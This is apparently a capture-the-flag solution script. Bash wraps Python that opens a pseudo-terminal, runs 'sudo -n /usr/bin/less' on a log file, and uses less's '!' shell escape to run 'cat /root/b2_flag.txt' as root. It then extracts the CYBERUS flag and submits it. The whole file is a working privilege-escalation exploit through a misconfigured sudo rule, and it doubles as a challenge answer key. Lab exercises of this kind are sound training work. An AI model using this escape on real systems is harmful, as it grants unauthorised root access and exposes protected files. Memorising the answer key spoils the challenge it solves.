#!/usr/bin/env bash
set -euo pipefail

# Drive `sudo /usr/bin/less /var/log/quest-demo.log` inside a PTY to trigger `!` shell escape
FLAG="$(python3 -I - << 'PYEOF'
import os
import pty
import re
import select
import subprocess
import time

master, slave = pty.openpty()
env = os.environ.copy()
env["TERM"] = "xterm-256color"

proc = subprocess.Popen(
    ["sudo", "-n", "/usr/bin/less", "/var/log/quest-demo.log"],
    stdin=slave,
    stdout=slave,
    stderr=slave,
    env=env,
    close_fds=True,
)
os.close(slave)

time.sleep(0.3)
os.write(master, b"!cat /root/b2_flag.txt\n")
time.sleep(0.4)
os.write(master, b"\nq\n")

output = b""
deadline = time.time() + 5.0
while time.time() < deadline:
    r, _, _ = select.select([master], [], [], 0.2)
    if master in r:
        try:
            chunk = os.read(master, 4096)
            if not chunk:
                break
            output += chunk
            if b"CYBERUS{" in output:
                break
        except OSError:
            break

os.close(master)
proc.terminate()
try:
    proc.wait(timeout=2)
except Exception:
    proc.kill()

text = output.decode("utf-8", errors="replace")
m = re.search(r"CYBERUS\{[^}\r\n]+\}", text)
if not m:
    raise SystemExit(f"Failed to capture B2 flag from less PTY. Output: {text}")
print(m.group(0))
PYEOF
)"

quest submit "$FLAG"
